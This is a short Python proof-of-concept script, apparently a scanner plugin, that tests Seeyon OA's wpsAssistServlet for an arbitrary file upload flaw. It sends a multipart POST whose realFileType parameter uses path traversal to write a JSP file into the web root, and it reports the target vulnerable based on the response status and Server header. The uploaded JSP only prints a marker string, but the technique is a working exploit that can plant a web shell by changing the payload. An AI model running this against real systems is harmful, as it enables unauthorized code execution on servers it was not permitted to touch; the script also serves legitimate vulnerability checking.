#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = "https://blog.csdn.net/weixin_53009585/article/details/129653831"
  ret['huixian'] = ''
  ret['method'] = 'post'
  ret['bugname'] = "致远OA wpsAssistServlet 任意文件上传漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {
        'User-Agent': ua,
        "Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
        }
  target = "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
  data = """--59229605f98b8cf290a7b8908b34616b
      Content-Disposition: form-data; name="upload"; filename="123.xls"
      Content-Type: application/vnd.ms-excel

      <% out.println("seeyon_vuln");%>
      --59229605f98b8cf290a7b8908b34616b--
      """
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    if res.status_code == 200 and res.headers['Server']== 'SY8045':
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret